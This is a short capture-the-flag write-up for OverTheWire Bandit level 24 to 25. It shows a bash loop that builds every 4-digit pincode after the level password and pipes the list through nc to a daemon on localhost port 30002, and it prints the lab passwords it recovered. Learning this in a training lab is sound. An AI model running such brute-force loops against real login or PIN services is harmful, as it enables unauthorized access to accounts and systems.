# Bandit Level 24 → 25

## Goal

   Bruteforce the 4‑digit numeric pincode by sending the Bandit24 password + pincode to the daemon listening on localhost port 30002 using a single connection, and
   retrieve the next level password.

---

## Process

1. Create a working directory in /tmp/ and move into it:
   `mkdir /tmp/bn24-25` && `cd /tmp/bn24-25`

2. Create the brute-force script:
   `nano script.sh`

3. Add the following content inside script.sh:
  ```
    #!/bin/bash
     for i in {0..9}{0..9}{0..9}{0..9}
     do
     echo "gbBKRRCsshuZXI0tUuR6yp0Fj1Zbf368 $i" >> list.txt
     done
```

4. Give execute permission and run the script to generate all combinations:

   `chmod +x script.sh` && `./script.sh`

5. Verify generated files:
    `ls`

6. Send the brute-forced password + pincode list to the listening daemon:
  
    `cat list.txt | nc localhost 30002`

7. After multiple failed attempts, the correct password was returned from one valid combination.

---

## Password Found:
   iCi86ttT4KSNe1armKiwbQNmB3YJP3q4

----

## Screenshot:

   screenshots/Level24-25_(1).png
   
   screenshots/Level24-25_(2)-final.png

----

## Notes:

   -Learned how to brute-force numeric pincodes efficiently using bash loops.
   
   -Learned that cron/automation is not used here, only a listening daemon on a port.
